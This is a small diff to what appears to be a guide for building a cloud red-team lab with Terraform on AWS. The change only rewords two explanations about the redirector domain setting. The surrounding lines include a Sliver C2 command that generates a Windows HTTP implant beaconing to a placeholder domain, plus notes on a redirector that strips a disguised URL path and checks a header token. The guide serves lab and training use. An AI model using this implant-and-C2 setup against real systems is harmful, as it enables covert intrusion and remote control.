@@ -230,7 +230,7 @@ notepad terraform.tfvars  # Windows
 localPub_ip              = "YOUR_IP/32"           # Replace with your IP + /32
 ssh_key_name             = "rs-rsa-key"            # Must match your AWS key pair name
 ssh_private_key_path     = "./rs-rsa-key.pem"      # Path to your .pem file (for Windows password decryption)
-redirector_domain        = "yourdomain.tld"        # Your domain — apex (yourdomain.tld) or subdomain (c2.yourdomain.tld)
+redirector_domain        = "yourdomain.tld"        # Your domain — apex or subdomain (see Step 1.6)
 enable_external_vpn      = false                   # Set to true for HTB/THM/ProvingGrounds access (see Part 8)
 ```
 
@@ -1095,7 +1095,7 @@ This starts an HTTP listener on port 80. The redirector forwards traffic from th
 sliver > generate --http https://<YOUR_DOMAIN>/cloud/storage/objects/ --os windows --arch amd64 --format exe --save /tmp/implant.exe
 ```
 
-Replace `<YOUR_DOMAIN>` with your redirector's domain (e.g., `c2.yourdomain.tld`). The `/cloud/storage/objects/` prefix is stripped by the redirector before forwarding to Sliver.
+Replace `<YOUR_DOMAIN>` with your `redirector_domain` value from `terraform.tfvars`. The `/cloud/storage/objects/` prefix is stripped by the redirector before forwarding to Sliver.
 
 > **Note:** The implant must also send the `X-Request-ID` header with the correct token value. Configure this in the Sliver HTTP C2 profile or use Sliver's `--header` flag if available.
 
